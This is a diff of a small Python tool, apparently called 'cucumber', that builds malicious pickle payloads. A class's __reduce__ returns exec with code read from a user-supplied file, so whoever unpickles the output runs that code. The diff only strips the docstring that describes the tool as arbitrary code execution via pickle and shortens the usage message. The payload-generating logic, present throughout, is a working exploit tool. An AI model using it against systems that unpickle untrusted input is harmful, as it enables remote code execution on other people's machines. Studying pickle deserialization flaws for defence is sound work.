@@ -1,16 +1,8 @@
 #!/usr/bin/env python3
 
 
-
-'''cucumber, ACE via Python pickle unpacking.
-
-cucumber [path]'''
-
-
-
 from sys import argv, stdout
 from pickle import dumps
-
 
 
 def require(path):
@@ -24,10 +16,8 @@ def require(path):
         return False
 
 
-
 def output(bytes):
     stdout.buffer.write(bytes)
-
 
 
 class exploit:
@@ -36,7 +26,6 @@ class exploit:
 
     def __reduce__(self):
         return (exec, (self.code,))
-
 
 def main():
     if len(argv) == 2:
@@ -53,8 +42,7 @@ def main():
             print('Yikes!, unable to read from file.')
 
     else:
-       print(__doc__)
-
+       print('arguments: [path]')
 
 
 main()
